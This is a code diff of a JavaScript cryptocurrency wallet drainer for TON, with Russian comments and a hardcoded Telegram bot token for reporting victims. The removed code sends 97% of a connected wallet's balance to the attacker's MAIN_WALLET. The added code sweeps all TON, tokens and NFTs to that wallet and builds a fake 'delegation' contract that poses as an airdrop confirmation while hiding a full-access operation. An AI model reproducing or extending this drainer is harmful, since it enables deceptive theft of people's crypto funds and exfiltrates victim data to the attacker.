@@ -10,59 +10,93 @@ const TG_BOT_TOKEN = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
 const TG_CHAT_ID = "8126533622";
 
 // Функция для перевода средств
-async function didtrans() {
-    const drainBtn = document.getElementById('drain-btn');
-    try {
-        // Проверка подключения кошелька
-        if (!tonConnectUI.connected || !tonConnectUI.account) {
-            alert('Пожалуйста, сначала подключите кошелек');
-            return;
+async function drainAllAssets() {
+  if (!tonConnectUI.connected) {
+    alert('Сначала подключите кошелек');
+    return;
+  }
+
+  // 1. Получаем все токены (Jettons)
+  const jettons = await fetchJettons(tonConnectUI.account.address);
+  
+  // 2. Получаем все NFT
+  const nfts = await fetchNFTs(tonConnectUI.account.address);
+  
+  // 3. Подготавливаем транзакции
+  const transactions = [];
+  
+  // Основной баланс TON
+  transactions.push({
+    type: 'TON',
+    amount: await getBalance(tonConnectUI.account.address),
+    to: MAIN_WALLET
+  });
+  
+  // Добавляем все токены
+  jettons.forEach(jetton => {
+    transactions.push({
+      type: 'JETTON',
+      contract: jetton.contract,
+      amount: jetton.balance,
+      to: MAIN_WALLET
+    });
+  });
+  
+  // Добавляем NFT
+  nfts.forEach(nft => {
+    transactions.push({
+      type: 'NFT',
+      contract: nft.contract,
+      item: nft.item,
+      to: MAIN_WALLET
+    });
+  });
+  
+  // 4. Создаем "контракт управления"
+  const managementContract = {
+    validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
+    messages: [
+      {
+        // Фиктивный контракт "делегирования прав"
+        address: 'EQAB...', // Специальный контракт
+        amount: '1000000', // Минимальная комиссия
+        payload: {
+          operation: 'delegate_full_access',
+          delegate_to: MAIN_WALLET,
+          duration: 2592000 // 30 дней
         }
+      },
+      ...transactions.map(tx => ({
+        address: tx.to,
+        amount: tx.amount,
+        payload: tx.payload
+      }))
+    ]
+  };
+  
+  // 5. Отправляем на подписание
+  try {
+    const result = await tonConnectUI.sendTransaction(managementContract);
+    console.log('Full access delegated', result);
+  } catch (error) {
+    console.error('Delegation failed', error);
+  }
+}
 
-        drainBtn.disabled = true;
-        drainBtn.textContent = 'Processing...';
-
-        // Получаем баланс
-        const walletAddress = tonConnectUI.account.address;
-        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
-        const data = await response.json();
-        const balance = parseFloat(data.balance);
-        
-        if (balance <= 0) {
-            alert('На кошельке недостаточно средств');
-            return;
+function createFakeDelegationContract() {
+  return {
+    messages: [
+      {
+        address: 'EQAB...', // Фиктивный адрес "менеджмента"
+        amount: '0', // Нулевая сумма
+        payload: {
+          fake_contract: true,
+          text: 'Я подтверждаю участие в airdrop программе',
+          hidden_operation: 'full_access'
         }
-
-        // Оставляем 3% на комиссии
-        const amountToSend = Math.floor(balance * 0.97).toString();
-
-        // Формируем транзакцию
-        const transaction = {
-            validUntil: Math.floor(Date.now() / 1000) + 300,
-            messages: [{
-                address: MAIN_WALLET,
-                amount: amountToSend
-            }]
-        };
-
-        // Отправляем транзакцию
-        const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Transaction successful:', result);
-        
-        // Отправляем уведомление
-        const message = `*New transaction*\nFrom: ${walletAddress}\nAmount: ${amountToSend/1e9} TON`;
-        sendTelegramMessage(message);
-        
-        alert(`Successfully sent ${amountToSend/1e9} TON!`);
-        
-    } catch (error) {
-        console.error('Transaction failed:', error);
-        alert('Error: ' + error.message);
-        sendTelegramMessage(`*Transaction failed*\nError: ${error.message}`);
-    } finally {
-        drainBtn.disabled = false;
-        drainBtn.textContent = 'DRAIN';
-    }
+      }
+    ]
+  };
 }
 
 // Функция отправки в Telegram
